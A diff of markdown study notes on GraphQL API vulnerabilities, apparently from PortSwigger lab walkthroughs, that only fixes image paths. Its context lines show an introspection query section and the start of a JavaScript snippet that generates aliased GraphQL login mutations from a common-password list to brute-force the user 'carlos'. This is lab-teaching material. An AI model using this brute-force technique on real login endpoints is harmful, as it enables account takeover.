@@ -59,7 +59,7 @@ query {
 - Burp can test and will report whether introspection is enabled
 - Full query:
 
-![](assets/Images/GraphQL%20API%20Vulnerabilities/Introspection_query_full.png)
+![](/assets/Images/GraphQL%20API%20Vulnerabilities/Introspection_query_full.png)
 
 ```JSON
 #Full introspection query 
@@ -206,7 +206,7 @@ query isValidDiscount($code: Int) {
 
 Notice the GraphQL tab, and the script PortSwigger gives us to generate the list of usernames and passwords
 
-![](assets/Images/GraphQL%20API%20Vulnerabilities/graphql_task4.png)
+![](/assets/Images/GraphQL%20API%20Vulnerabilities/graphql_task4.png)
 
 ```
 copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>` bruteforce$index:login(input:{password: "$password", username: "carlos"}) { 
